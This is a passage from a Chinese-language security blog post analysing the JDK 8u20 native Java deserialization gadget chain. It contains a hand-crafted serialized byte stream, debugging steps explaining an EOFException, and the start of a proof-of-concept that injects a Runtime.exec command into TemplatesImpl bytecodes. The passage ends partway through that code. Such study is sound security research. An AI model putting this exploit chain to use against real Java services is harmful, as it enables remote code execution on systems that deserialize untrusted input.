</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//tmpFiled --&gt; BeanContextSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#e06c75">BeanContextSupport</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#56b6c2">-</span><span style="color:#d19a66">4879613978649577204L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;I&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;serializable&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#7f848e">//只需要serialzable这一个成员变量
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#7f848e">//superclass --&gt; BeanContextChildSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">BeanContextChildSupport</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#d19a66">6328947014421475877L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>    <span style="color:#7f848e">//简化处理, 不用加上SC_WRITE_METHOD, 用不到
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;beanContextChildPeer&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/beans/beancontext/BeanContextChild;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#7f848e">//beanContextChildPeer
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">22</span><span style="color:#56b6c2">,</span>  <span style="color:#7f848e">//引用beanContextSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#7f848e">//serializable
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//objectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                    <span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#d19a66">6182022883658399397L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;memberValues&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/util/Map;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;type&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/Class;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#7f848e">//memberValues
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#d19a66">362498820763181265L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;F&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;loadFactor&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;I&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;threshold&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                <span style="color:#d19a66">0x3f400000</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#d19a66">0x0000000c</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#7f848e">//objectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                    <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">8</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                    <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                    <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span><span style="color:#56b6c2">,</span>   
</span></span><span style="display:flex;"><span>    																<span style="color:#7f848e">//引用templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                    <span style="color:#7f848e">//type
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                        <span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">4</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>  <span style="color:#7f848e">//这里把count置0
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//h
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">26</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">};</span>
</span></span></code></pre></div><h5 id="疑惑点">疑惑点</h5>
<p>这段代码按理来说应该没什么问题，但是在反序列化<code>AnnotationInvocationHandler</code>类时却抛出了一个<code>EOFException</code>异常</p>
<p>断点调试<strong>BeanContextSupport.readObject</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142034850.png"
	width="1195"
	height="412"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142034850_hu31d0d663da35232c56d95d11bf4d1768_59679_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142034850_hu31d0d663da35232c56d95d11bf4d1768_59679_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142034850"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="696px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142151387.png"
	width="1200"
	height="260"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142151387_huf5a9d2b081116360edf0febb0145dc0c_34353_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142151387_huf5a9d2b081116360edf0febb0145dc0c_34353_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142151387"
	
	
		class="gallery-image" 
		data-flex-grow="461"
		data-flex-basis="1107px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142202818.png"
	width="1201"
	height="101"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142202818_hu519287959df5160c38707ad4949c46d8_16656_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142202818_hu519287959df5160c38707ad4949c46d8_16656_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142202818"
	
	
		class="gallery-image" 
		data-flex-grow="1189"
		data-flex-basis="2853px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142227102.png"
	width="1198"
	height="309"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142227102_huc4576fdbf6328452beb782f54bd26435_45816_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142227102_huc4576fdbf6328452beb782f54bd26435_45816_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142227102"
	
	
		class="gallery-image" 
		data-flex-grow="387"
		data-flex-basis="930px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142242175.png"
	width="1198"
	height="255"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142242175_hud665fa50bd20ac9f00624846f94fa8cb_32520_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142242175_hud665fa50bd20ac9f00624846f94fa8cb_32520_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142242175"
	
	
		class="gallery-image" 
		data-flex-grow="469"
		data-flex-basis="1127px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142310597.png"
	width="1192"
	height="281"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142310597_huf4f334b1be948ec3535cb968725bfe2a_29295_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142310597_huf4f334b1be948ec3535cb968725bfe2a_29295_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142310597"
	
	
		class="gallery-image" 
		data-flex-grow="424"
		data-flex-basis="1018px"
	
></p>
<p>进入<code>ObjectInputStream.refill</code></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142516155.png"
	width="1191"
	height="439"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142516155_hu9411368266ebe2434e3b75360cd3d89a_39544_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142516155_hu9411368266ebe2434e3b75360cd3d89a_39544_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142516155"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="651px"
	
></p>
<p>这里会进入<code>readBlockHeader</code>方法</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142631284.png"
	width="1194"
	height="280"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142631284_hu82fa016829f8f3bfc9bee1d2e911ada4_37961_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142631284_hu82fa016829f8f3bfc9bee1d2e911ada4_37961_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142631284"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1023px"
	
></p>
<p>由于<code>defaultDataEnd == true</code>，因此会<code>in.read()</code>会返回<code>-1</code></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142242175.png"
	width="1198"
	height="255"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142242175_hud665fa50bd20ac9f00624846f94fa8cb_32520_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602142242175_hud665fa50bd20ac9f00624846f94fa8cb_32520_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602142242175"
	
	
		class="gallery-image" 
		data-flex-grow="469"
		data-flex-basis="1127px"
	
></p>
<p><code>ch1 == ch2 == ch3 == ch4 == -1</code>，所以抛出<code>EOFException</code></p>
<p>涉及改动<code>defaultDataEnd</code>的方法一共有3个</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153025576.png"
	width="876"
	height="182"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153025576_hudee91989cd5d38c21c1d9de0f5545f16_19995_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153025576_hudee91989cd5d38c21c1d9de0f5545f16_19995_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602153025576"
	
	
		class="gallery-image" 
		data-flex-grow="481"
		data-flex-basis="1155px"
	
></p>
<p>我们逐步下个断点，看看<code>defaultDataEnd</code>是怎么变成<code>true</code>的</p>
<p>看到<code>defaultReadObject()</code></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153445446.png"
	width="1199"
	height="285"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153445446_hu501589c7bca34fa53c496f062795d9a3_76548_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153445446_hu501589c7bca34fa53c496f062795d9a3_76548_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602153445446"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153501212.png"
	width="1203"
	height="358"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153501212_hud46070056dff08e4a1f77440a3e4675a_47360_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153501212_hud46070056dff08e4a1f77440a3e4675a_47360_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602153501212"
	
	
		class="gallery-image" 
		data-flex-grow="336"
		data-flex-basis="806px"
	
></p>
<p>进入<code>curDesc.hasWriteObjectData()</code></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153652061.png"
	width="1203"
	height="86"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153652061_hu5ce2388758ae4a42fa64797b5864290b_9518_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153652061_hu5ce2388758ae4a42fa64797b5864290b_9518_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602153652061"
	
	
		class="gallery-image" 
		data-flex-grow="1398"
		data-flex-basis="3357px"
	
></p>
<p><code>hasWriteObjectData</code>  在 <code>readNonProxy</code>方法中被修改</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153800206.png"
	width="1207"
	height="283"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153800206_hueba88f70cfe69078b2e3ee15b500c142_40555_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602153800206_hueba88f70cfe69078b2e3ee15b500c142_40555_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602153800206"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1023px"
	
></p>
<p>因为<code>AnnotationInvocationHandler</code>的<code>classDescFlags</code>没有写入<code>SC_WRITE_METHOD</code>，所以<code>defaultDataEnd == true</code>，抛出了异常</p>
<p>所以我们只要将<code>AnnotationInvocationHandler</code>类的<code>classDescFlags</code>修改成<code>(byte) (SC_SERIALIZABLE|SC_WRITE_METHOD)</code>即可</p>
<p>但是这里要注意，<code>AnnotationInvocationHandler</code>并没有重写<code>writeObject</code>方法，所以<code>readObject</code>也不会读取<code>objectAnnotation</code>内的数据，不要往里面写入数据，不然后面解析的时候反而会报错</p>
<p><strong>POC</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">jdk8u20Chain</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">classPool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">ctClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">classPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ctClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ctClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">classPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ctClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
